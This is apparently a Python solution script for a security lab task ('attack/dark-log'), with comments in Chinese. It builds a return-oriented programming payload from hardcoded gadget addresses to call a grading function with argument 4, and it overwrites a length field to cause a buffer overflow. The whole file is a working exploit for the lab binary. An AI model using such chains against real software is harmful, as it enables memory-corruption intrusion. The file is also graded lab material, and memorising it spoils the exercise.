#!/usr/bin/env python3
"""Task 4: build the payload for attack/dark-log.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

def p64(x):
    return struct.pack('<Q', x)
def p32(x):
    return struct.pack('<I', x)

# 填入正确的地址
pop_rdi_ret = 0x4018a3     # 找出的 gadget
grade_eval_addr = 0x401677 # 正确地址！
ret_gadget = 0x4017f4      # input 函数末尾的单纯 ret 指令，用于栈对齐

# 1. 构造 ROP 链 (共 128 字节)
rop_chain = p64(ret_gadget)    # 先经过一个 ret 解决对齐问题
rop_chain += p64(pop_rdi_ret)
rop_chain += p64(4)            # 参数 4
rop_chain += p64(grade_eval_addr)
rop_chain += b'A' * (128 - len(rop_chain)) 

# 2. 组装 Payload
payload = rop_chain + b'B' * 128

# 3. 精准覆盖 f.len 为 168 (0xa8)
payload += p32(168)

sys.stdout.buffer.write(payload)